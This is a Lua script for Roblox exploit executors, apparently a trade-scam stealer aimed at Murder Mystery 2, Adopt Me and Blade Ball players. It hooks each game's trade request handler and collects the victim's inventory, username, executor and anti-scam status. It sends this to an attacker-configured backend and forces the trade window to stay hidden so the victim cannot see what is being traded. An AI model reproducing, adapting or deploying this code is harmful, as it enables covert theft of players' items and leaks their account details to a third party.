local CFG = getgenv().CFG
local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local function http(method, url, body, headers)
    local req = (syn and syn.request) or (http and http.request) or request
    return req({Url=url, Method=method, Body=body, Headers=headers or {}})
end

local function get_executor()
    if identifyexecutor then return identifyexecutor() end
    if KRNL_LOADED then return "Krnl" end
    if SYNAPSE_LOADED then return "Synapse" end
    return "Unknown"
end

local function get_roblox_version()
    if version then return version() end
    return "Unknown"
end

local function detect_antiscam()
    local g = getgenv()
    local flags = {"antiscam","TradeBlocker","ScamGuard","NoTrade"}
    for _,f in ipairs(flags) do
        if g[f] then return true end
    end
    return false
end

local function send_job(game_name, items)
    local payload = {
        game         = game_name,
        username     = lp.Name,
        display_name = lp.DisplayName,
        executor     = get_executor(),
        roblox_version = get_roblox_version(),
        antiscam     = detect_antiscam(),
        allowed      = CFG.allowed,
        place_id     = tostring(PlaceId),
        job_id       = game.JobId,
        items        = items,
    }
    local body = game:GetService("HttpService"):JSONEncode(payload)
    http("POST", CFG.backend.."/job", body, {
        ["Content-Type"]  = "application/json",
        ["X-API-Key"]     = CFG.api_key,
    })
end

local function collect_mm2_items()
    local items = {}
    local inv = lp:FindFirstChild("Inventory") or lp:FindFirstChild("OwnedItems")
    if inv then
        for _, v in ipairs(inv:GetChildren()) do
            table.insert(items, {name=v.Name, id=tostring(v.Value or ""), rarity=tostring(v:FindFirstChild("Rarity") and v.Rarity.Value or "Unknown")})
        end
    end
    for _, tool in ipairs(lp.Backpack:GetChildren()) do
        table.insert(items, {name=tool.Name, id=tool.ToolId or "", rarity="Unknown"})
    end
    return items
end

local function collect_adoptme_items()
    local items = {}
    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
    if inv then
        for _, v in ipairs(inv:GetDescendants()) do
            if v:IsA("StringValue") or v:IsA("IntValue") then
                table.insert(items, {name=v.Name, id=tostring(v.Value), rarity="Pet"})
            end
        end
    end
    return items
end

local function hook_mm2()
    local RS = game:GetService("ReplicatedStorage")
    local remote = RS:WaitForChild("TradeRequest", 10)
    if not remote then return end
    local old_invoke
    old_invoke = hookfunction(remote.OnClientInvoke, function(...)
        local items = collect_mm2_items()
        send_job("MM2", items)
        task.wait(CFG.delay / 1000)
        return old_invoke(...)
    end)
    local gui = lp:WaitForChild("PlayerGui"):WaitForChild("TradeGui", 10)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local function hook_adoptme()
    local RS = game:GetService("ReplicatedStorage")
    local remote = RS:WaitForChild("Pets", 10)
        and RS.Pets:WaitForChild("TradePets", 10)
    if not remote then return end
    local old_invoke
    old_invoke = hookfunction(remote.OnClientInvoke, function(...)
        local items = collect_adoptme_items()
        send_job("AdoptMe", items)
        task.wait(CFG.delay / 1000)
        return old_invoke(...)
    end)
    local gui = lp:WaitForChild("PlayerGui"):WaitForChild("TradeMenu", 10)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local function hook_bladeball()
    local items = {}
    local mgp = lp:FindFirstChild("leaderstats")
    if mgp then
        for _, v in ipairs(mgp:GetChildren()) do
            table.insert(items, {name=v.Name, id="", rarity=tostring(v.Value)})
        end
    end
    send_job("BladeBall", items)
end

local GAMES = {
    [142823291]   = hook_mm2,
    [920587237]   = hook_adoptme,
    [13772394625] = hook_bladeball,
}

local handler = GAMES[PlaceId]
if handler then
    handler()
else
    send_job("Unknown", {})
end